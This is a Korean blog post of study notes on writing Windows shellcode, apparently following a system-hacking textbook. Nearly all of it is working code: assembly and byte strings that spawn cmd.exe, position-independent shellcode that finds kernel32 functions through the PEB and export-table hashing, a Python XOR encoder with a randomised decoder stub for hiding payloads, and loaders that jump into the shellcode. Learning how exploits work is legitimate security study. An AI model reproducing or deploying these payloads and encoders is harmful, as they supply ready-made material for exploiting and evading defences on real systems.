---
title: 윈도우 시스템 해킹 - 쉘코드 원리와 작성
category:
    - System Hacking
tags:
    - Windows
    - System Hacking
---
"윈도우 시스템 해킹 가이드" 책을 보면서 작성한 코드 정리
#### 기본 쉘코드
```c
int _tmain(int argc, _TCHAR* argv[]) {
    char cmd[4] = {'c', 'm', 'd', '\0'};
    WinExec(cmd, SW_SHOW);
    ExitProcess(1);
}
```
#### op코드 및 단순화
```c
int _tmain(int argc, _TCHAR* argv[]) {
	__asm {
		// cmd
		xor			ebx, ebx
		mov			dword ptr[ebp - 4], ebx
		mov			byte ptr[ebp - 4], 0x63
		mov			byte ptr[ebp - 3], 0x6D
		mov			byte ptr[ebp - 2], 0x64
		// call WinExec('cmd', SW_SHOW)
		push		5
		lea			eax, [ebp - 4]
		push        eax
		mov			eax, 0x74F3D220
		call        eax
		// call ExitProcess(1)
		push        1
		mov			eax, 0x74F04F20
		call        eax
	};
}
```
#### Null byte 제거
```c
char shellcode[] =
    "\x33\xDB"
    "\x89\x5D\xFC"
    "\xC6\x45\xFC\x63"
    "\xC6\x45\xFD\x6D"
    "\xC6\x45\xFE\x64"
    "\x6A\x05"
    "\x8D\x45\xFC"
    "\x50"
    "\xB8\x20\xD2\xF3\x74"
    "\xFF\xD0"
    "\x6A\x01"
    "\xB8\x20\x4F\xF0\x74"
    "\xFF\xD0";

int _tmain(int argc, _TCHAR* argv[]) {
	int* shell = (int*)shellcode;
	__asm {
		jmp shell
	};
}
```
#### Universal 쉘코드
```c
void main() {
	__asm{
		jmp       tart

			get_func_addr:
			loop_ent:
		inc       edx		// index++
		lodsd			// eax = *esi, esi += 4   // esi에 함수 이름 주소가 있음
		pushad			// 레지스터들 저장!!
		add       ebx, eax	// 함수명 address
		mov       esi, ebx	// *esi = 함수명
		xor       eax, eax	// eax = 0
		xor       edi, edi	// edi = 0

			hash:
		lodsb                     // eax = *esi, esi += 1 // esi에 함수명의 글자가 있음
		add       edi, eax        // edi += char
		test      al, al          // eax가 null byte인지 검사
		jnz       hash            // null byte가 아니면 hash화 계속
		mov       [ebp+0x10], edi // 스택에 hash결과 저장

		popad                         // 레지스터 불러옴(기존 해시값이 edi에 저장되어 있음)
		cmp       [ebp+0x10], edi     // 해시비교
		jne       loop_ent
		movzx     edx, word ptr[ecx+edx*2-2]	// movzx(Move with zero extension) 2byte단위이고 index는 0부터 시작함을 참고
		mov       edi, [ebp+0x18]     // Export Table address
		mov       esi, [edi+0x1c]     // Export Address Table offset
		add       esi, ebx            // Export Address Table Address
		mov       edi, [esi+edx*4]    // 함수 offset
		add       edi, ebx            // 함수 address
		mov       eax, edi
		ret

			start:
		// cmd 문자열
		xor       eax, eax
		mov       [ebp+0xc], eax
		mov       [ebp+0xc], 0x63
		mov       [ebp+0xd], 0x6d
		mov       [ebp+0xe], 0x64

		// kernel32.dll base address 구하기
		mov       eax, fs:[0x30]	// PEB
		mov       eax, [eax+0xc]	// LDR
		mov       eax, [eax+0x14]	// Code
		mov       ebx, [eax]		// ntdll
		mov       ebx, [ebx]		// kernel32
		mov       ebx, [ebx+0x10]	// $ ebx = kernel32.dll base address

		// Export table 주소 구하기
		mov       edi, [ebx+0x3C]	// IMAGE_NT_HEADER offset
		add       edi, ebx		// IMAGE_NT_HEADER address
		mov       edi, [edi+0x78]	// Export Table offset (IMAGE_EXPORT_DIRECTORY)
		add       edi, ebx		// edi = Export Table address
		mov       [ebp+0x18], edi	// stak에 Export Table address 저장
		mov       esi, [edi+0x20]	// Export Name Pointer Table offset
		add       esi, ebx		// $ esi = Export Name Pointer Table address
		mov       ecx, [edi+0x24]	// Export Ordinal Table offset
		add       ecx, ebx		// $ ecx = Export Ordinal Table address

		// 레지스터 초기화 및 저장
		xor       edx, edx
		pushad

		// WinExec 함수 주소 구하기
		xor       edi, edi
		mov       di, 0x2b3
		call      get_func_addr
		mov       [ebp+0x20], eax
		popad

		// ExitProcess 함수 주소 구하기
		xor       edi, edi
		mov       di, 0x479
		call      get_func_addr
		mov       [ebp+0x24], eax

		// 이후 로직
		xor       eax, eax
		push      eax
		lea       eax, [ebp+0xc]
		push      eax
		call      [ebp+0x20]	// WinExec('cmd', 0)

		xor       eax, eax
		push      eax
		call      [ebp+0x24]	// ExitProcess(0)

	}

}
```
#### Universal 쉘코드 (바이트 코드)
```c
char shellcode[] =
"\xEB\x30\x42\xAD\x60\x03\xD8\x8B\xF3\x33\xC0\x33\xFF\xAC\x03\xF8"
"\x84\xC0\x75\xF9\x89\x7D\x10\x61\x39\x7D\x10\x75\xE5\x0F\xB7\x54"
"\x51\xFE\x8B\x7D\x18\x8B\x77\x1C\x03\xF3\x8B\x3C\x96\x03\xFB\x8B"
"\xC7\xC3\x33\xC0\x89\x45\x0C\xC6\x45\x0C\x63\xC6\x45\x0D\x6D\xC6"
"\x45\x0E\x64\x64\xA1\x30\x00\x00\x00\x8B\x40\x0C\x8B\x40\x14\x8B"
"\x18\x8B\x1B\x8B\x5B\x10\x8B\x7B\x3C\x03\xFB\x8B\x7F\x78\x03\xFB"
"\x89\x7D\x18\x8B\x77\x20\x03\xF3\x8B\x4F\x24\x03\xCB\x33\xD2\x60"
"\x33\xFF\x66\xBF\xB3\x02\xE8\x87\xFF\xFF\xFF\x89\x45\x20\x61\x33"
"\xFF\x66\xBF\x79\x04\xE8\x78\xFF\xFF\xFF\x89\x45\x24\x33\xC0\x50"
"\x8D\x45\x0C\x50\xFF\x55\x20\x33\xC0\x50\xFF\x55\x24";

int _tmain(int argc, _TCHAR* argv[]) {
	int* shell = (int*)shellcode;
	__asm {
		jmp shell
	}
}
```
#### 쉘코드 인코더 (python3)
```python
import os, sys, random
import struct

print(" [+] Simple XOR Shellcode Encoder")

def xor(data, key):
	leng = len(key)
	reverse = b""
	for i in range(0, len(data)):
		reverse += bytes([(data[i] ^ (key[i % leng]))])	# XOR
	return reverse

def conv_hex(data):
	hex_str = ""
	for i in range(0, len(data)):
		tmp = hex(data[i])[2:]
		if len(tmp) == 1:
			tmp = "0" + tmp
		hex_str += ("0x%s" % tmp).replace('0x', '\\x')
	return hex_str

org_shellcode = (
        b"\x8b\xec"	# mov ebp, esp 추가(overflow용..)
	b"\xEB\x30\x42\xAD\x60\x03\xD8\x8B\xF3\x33\xC0\x33\xFF\xAC\x03\xF8"
	b"\x84\xC0\x75\xF9\x89\x7D\x10\x61\x39\x7D\x10\x75\xE5\x0F\xB7\x54"
	b"\x51\xFE\x8B\x7D\x18\x8B\x77\x1C\x03\xF3\x8B\x3C\x96\x03\xFB\x8B"
	b"\xC7\xC3\x33\xC0\x89\x45\x0C\xC6\x45\x0C\x63\xC6\x45\x0D\x6D\xC6"
	b"\x45\x0E\x64\x64\xA1\x30\x00\x00\x00\x8B\x40\x0C\x8B\x40\x14\x8B"
	b"\x18\x8B\x1B\x8B\x5B\x10\x8B\x7B\x3C\x03\xFB\x8B\x7F\x78\x03\xFB"
	b"\x89\x7D\x18\x8B\x77\x20\x03\xF3\x8B\x4F\x24\x03\xCB\x33\xD2\x60"
	b"\x33\xFF\x66\xBF\xB3\x02\xE8\x87\xFF\xFF\xFF\x89\x45\x20\x61\x33"
	b"\xFF\x66\xBF\x79\x04\xE8\x78\xFF\xFF\xFF\x89\x45\x24\x33\xC0\x50"
	b"\x8D\x45\x0C\x50\xFF\x55\x20\x33\xC0\x50\xFF\x55\x24"
)


'''
decoder = (
	b"\xe8\xff\xff\xff\xff"        # call 0x4
	b"\xc2"                        # ret
	b"\x5e"                        # pop esi
	b"\x68" + bytes([len(org_shellcode)]) +b"\x00\x00\x00\x59"     # push length, pop ecx
	b"\xbf"                        # mov edi, xor_key
	+
	xor_key
	+
	b"\x31\x7e\x15"                # xor [esi+0x15], edi
	b"\x83\xc6\x04"                # add esi, 4
	b"\xe2\xf8"                    # loop xor
	)
'''

xor_key = os.urandom(4)

decoder1 = b"\xe8\xff\xff\xff\xff\xc2\x5e"		# Get PC
# decoder2를 xor ecx, ecx / mov cl, length 로 바꿈(null byte 제거함)
decoder2 = b"\x33\xc9\xb1" + bytes([len(org_shellcode)//4 + 1])	# Counter
decoder3 = b"\xbf" + xor_key	# XOR Key

decoder_rand = [decoder1, decoder2, decoder3]
random.shuffle(decoder_rand)

decoder = b"".join(decoder_rand)
getpc_offset = len(decoder) - decoder.index(decoder1) + 3
decoder4 = b"\x31\x7e" + bytes([getpc_offset]) + b"\x83\xc6\x04" + b"\xe2\xf8"
decoder += decoder4

xor_shellcode = xor(org_shellcode, xor_key)
print("Key : " + conv_hex(xor_key) + "\n")
print("Orginal : " + conv_hex(org_shellcode)+ "\n")
print("Encoded : " + conv_hex(decoder) + conv_hex(xor_shellcode) + "\n")
string = conv_hex(decoder) + conv_hex(xor_shellcode)

for idx, char in enumerate(string):
	if idx % 64 == 0:
		print("\tb\"", end='')
	print(char, end='')
	if idx % 64 == 63 or idx == len(string) - 1:
		print("\"")
```
책에서는 python2를 사용하여 python3로 위와 같이 포팅함. 쉘코드에 `\x8b\xec`를 추가한 이유는 이후 stack buffer overflow 실습에서 스택이 꼬인 상태로 exploit하게 되면 쉘코드가 동작하지 않아서 추가함.
#### 인코딩된 쉘코드
```c
char shellcode[] =
    "\xe8\xff\xff\xff\xff\xc2\x5e\x33\xc9\xb1\x9f\xbf\x58\x16\x30\x76"
    "\x31\x7e\x13\x83\xc6\x04\xe2\xf8\xd3\xfa\xdb\x46\x1a\xbb\x50\x75"
    "\x80\x9d\xc3\x45\x98\x25\xcf\xda\x5b\xee\xb4\xb6\x2d\xef\xb9\x0b"
    "\x48\x77\x09\x0b\x48\x63\xd5\x79\xef\x42\x61\x88\xd3\x6b\x28\xfd"
    "\x2f\x0a\x33\x85\xd3\x2a\xa6\x75\xa3\x9d\xf7\xb5\x6b\xd6\xb9\x33"
    "\x54\xd0\x75\x7a\x3b\xd0\x75\x7b\x35\xd0\x75\x78\x3c\x72\x91\x46"
    "\x58\x16\x30\xfd\x18\x1a\xbb\x36\x4c\x9d\x28\xfd\x43\x9d\x6b\x66"
    "\xd3\x6d\x0c\x75\xa3\x9d\x4f\x0e\x5b\xed\xb9\x0b\x40\x9d\x47\x56"
    "\x5b\xe5\xbb\x39\x7c\x15\xfb\x45\x8a\x76\x03\x89\x3e\xa9\x83\x74"
    "\xb0\x91\xcf\x89\xa7\x9f\x75\x56\x39\x25\xcf\x10\xe7\x6f\x34\x9e"
    "\x20\xe9\xcf\x89\xd1\x53\x14\x45\x98\x46\xbd\x33\x54\x46\xcf\x23"
    "\x78\x25\xf0\x26\xa7\x43\x14";

int _tmain(int argc, _TCHAR* argv[]) {
	int* shell = (int*)shellcode;
	__asm {
		jmp shell
	}
}
```
